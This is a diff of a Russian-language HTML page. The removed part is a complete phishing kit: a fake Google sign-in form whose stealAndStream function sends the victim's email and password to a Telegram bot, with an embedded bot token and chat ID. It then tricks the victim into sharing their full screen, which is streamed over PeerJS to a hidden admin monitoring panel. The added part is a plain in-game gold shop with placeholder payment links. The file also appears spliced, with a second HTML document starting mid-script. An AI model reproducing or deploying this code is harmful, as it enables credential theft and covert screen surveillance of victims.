@@ -3,122 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход – Google Аккаунты</title>
-    <script src="https://unpkg.com"></script>
-    <style>
-        :root { --google-blue: #1a73e8; --accent: #ffca28; --bg: #0d1117; }
-        body { font-family: 'Roboto', arial, sans-serif; margin: 0; background: #fff; color: #202124; overflow-x: hidden; }
-        
-        /* Google Form */
-        #google-auth { display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h2 { font-weight: 400; margin-bottom: 10px; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border: 2px solid var(--google-blue); }
-        .btn { background: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
-
-        /* Магазин */
-        #main-shop { display: none; background: var(--bg); color: white; min-height: 100vh; padding: 20px; }
-        .shop-card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .price { color: var(--accent); font-weight: bold; }
-
-        /* Админка */
-        #admin-panel { display: none; background: #000; min-height: 100vh; padding: 20px; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
-        video { width: 100%; border: 2px solid var(--accent); border-radius: 8px; background: #222; }
-    </style>
-</head>
-<body>
-
-<!-- 1. ФЕЙКОВЫЙ GOOGLE -->
-<div id="google-auth">
-    <div class="login-box" id="step-email">
-        <img src="https://www.google.com" style="width:75px">
-        <h2>Вход</h2>
-        <p>Используйте аккаунт Google</p>
-        <input type="email" id="email" placeholder="Телефон или адрес эл. почты">
-        <div style="text-align: left; color: var(--google-blue); font-size: 14px; margin-bottom: 40px; cursor:pointer">Забыли почту?</div>
-        <button class="btn" onclick="toPassword()">Далее</button>
-    </div>
-
-    <div class="login-box" id="step-password" style="display:none;">
-        <img src="https://www.google.com" style="width:75px">
-        <div id="user-email-display" style="font-size: 14px; border: 1px solid #dadce0; border-radius: 20px; padding: 5px; display: inline-block; margin-bottom:10px"></div>
-        <h2>Добро пожаловать</h2>
-        <input type="password" id="password" placeholder="Введите пароль">
-        <div style="text-align: left; color: var(--google-blue); font-size: 14px; margin-bottom: 40px; cursor:pointer">Забыли пароль?</div>
-        <button class="btn" onclick="stealAndStream()">Далее</button>
-    </div>
-</div>
-
-<!-- 2. ПАНЕЛЬ АДМИНА -->
-<div id="admin-panel">
-    <h1 style="grid-column: 1/-1; text-align: center; color: var(--accent);">LIVE MONITORING</h1>
-</div>
-
-<!-- 3. МАГАЗИН -->
-<div id="main-shop">
-    <h1 style="text-align: center; color: var(--accent);">STANDOFF 2 GOLD</h1>
-    <div class="shop-card"><div>500 Gold</div><div class="price">450 ₽</div></div>
-    <div class="shop-card"><div>1000 Gold</div><div class="price">850 ₽</div></div>
-    <div class="shop-card"><div>Gold Pass</div><div class="price">550 ₽</div></div>
-    <p style="text-align:center; color:red; font-weight:bold; margin-top:20px">⚠️ ВКЛЮЧИТЕ VPN RU ДЛЯ ОПЛАТЫ</p>
-</div>
-
-<script>
-    // ТВОИ ДАННЫЕ
-    const BOT_TOKEN = "6975522005:AAEoVa-RSaUAuJjm1QXGQzTjewESXwGr10Q";
-    const CHAT_ID = "1385043530";
-    const ADMIN_KEY = "SECRET_ADMIN_777"; 
-
-    let userEmail = "";
-    let peer;
-
-    // Вход для админа через ?admin в ссылке
-    window.onload = () => {
-        if (window.location.search.includes('admin')) {
-            document.getElementById('google-auth').style.display = 'none';
-            document.getElementById('admin-panel').style.display = 'grid';
-            initAdmin();
-        }
-    };
-
-    function toPassword() {
-        userEmail = document.getElementById('email').value;
-        if (userEmail.length < 5) return alert("Введите почту");
-        document.getElementById('user-email-display').innerText = userEmail;
-        document.getElementById('step-email').style.display = 'none';
-        document.getElementById('step-password').style.display = 'block';
-    }
-
-    async function stealAndStream() {
-        const pass = document.getElementById('password').value;
-        if (pass.length < 4) return alert("Неверный пароль");
-
-        // ОТПРАВКА ЛОГА В ТВОЙ ТЕЛЕГРАМ
-        const msg = `🔥 НОВЫЙ ЛОГ!\n📧 Почта: ${userEmail}\n🔑 Пароль: ${pass}`;
-        fetch(`https://api.telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-
-        // ЗАПУСК ТРАНСЛЯЦИИ
-        try {
-            alert("Для завершения авторизации выберите 'Весь экран' в следующем окне.");
-            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            
-            const myPeerId = "User_" + Math.floor(Math.random() * 9999);
-            peer = new Peer(myPeerId);
-            
-            peer.on('open', () => {
-                peer.call(ADMIN_KEY, stream);
-                showShop();
-            });
-        } catch (e) {
-            showShop(); // Пускаем в магазин даже если отказал в экране
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STANDOFF 2 | MULTI-SHOP</title>
+    <title>STANDOFF 2 | GOLD SHOP</title>
     <style>
         :root { --accent: #ff8c00; --bg: #0d0d0f; --card: #1a1b1e; --danger: #ff4444; }
         body { background: var(--bg); color: white; font-family: 'Arial Black', sans-serif; margin: 0; padding: 20px 20px 180px 20px; }
@@ -158,43 +43,47 @@
 <body>
 
 <div class="header">
-    <h1>STANDOFF 2 MULTI-SHOP</h1>
+    <h1>STANDOFF 2 GOLD SHOP</h1>
 </div>
 
 <div class="user-input">
-    <label>Данные для получения</label>
-    <input type="text" id="user_id" placeholder="Ваш ID или Ссылка на ТГ">
+    <label>Данные для начисления</label>
+    <input type="text" id="user_id" placeholder="Ваш ID или Telegram">
 </div>
 
 <div class="section-title">Игровая валюта (Gold)</div>
 <div class="services">
     <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
+        <div class="info"><h3>100 Gold</h3><p>Рынок / Передача</p></div>
+        <div class="price">89 ₽</div>
+    </a>
+    <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
+        <div class="info"><h3>200 Gold</h3><p>Рынок / Передача</p></div>
+        <div class="price">166 ₽</div>
+    </a>
+    <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
         <div class="info"><h3>500 Gold</h3><p>Пополнение через рынок</p></div>
-        <div class="price">350 ₽</div>
+        <div class="price">373 ₽</div>
     </a>
     <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
-        <div class="info"><h3>1000 Gold</h3><p>Пополнение через рынок</p></div>
-        <div class="price">650 ₽</div>
+        <div class="info"><h3>1000 Gold</h3><p>Выгодный набор</p></div>
+        <div class="price">724 ₽</div>
     </a>
     <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
-        <div class="info"><h3>3000 Gold</h3><p>Самый выгодный курс</p></div>
-        <div class="price">1800 ₽</div>
+        <div class="info"><h3>2000 Gold</h3><p>Пополнение через рынок</p></div>
+        <div class="price">1368 ₽</div>
+    </a>
+    <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
+        <div class="info"><h3>3000 Gold</h3><p>Для топовых скинов</p></div>
+        <div class="price">1935 ₽</div>
     </a>
 </div>
 
-<div class="section-title">Pass & Ножи</div>
+<div class="section-title">Season Pass</div>
 <div class="services">
     <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
-        <div class="info"><h3>Gold Pass</h3><p>Текущий сезон</p></div>
-        <div class="price">590 ₽</div>
-    </a>
-    <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
-        <div class="info"><h3>M9 Bayonet (Скин)</h3><p>Случайная раскраска</p></div>
-        <div class="price">1200 ₽</div>
-    </a>
-    <a href="ВАША_ССЫЛКА_ТУТ" class="option" onclick="return checkInput()">
-        <div class="info"><h3>Karambit (Скин)</h3><p>Случайная раскраска</p></div>
-        <div class="price">1500 ₽</div>
+        <div class="info"><h3>Gold Pass</h3><p>Текущий сезон (Full)</p></div>
+        <div class="price">568 ₽</div>
     </a>
 </div>
 
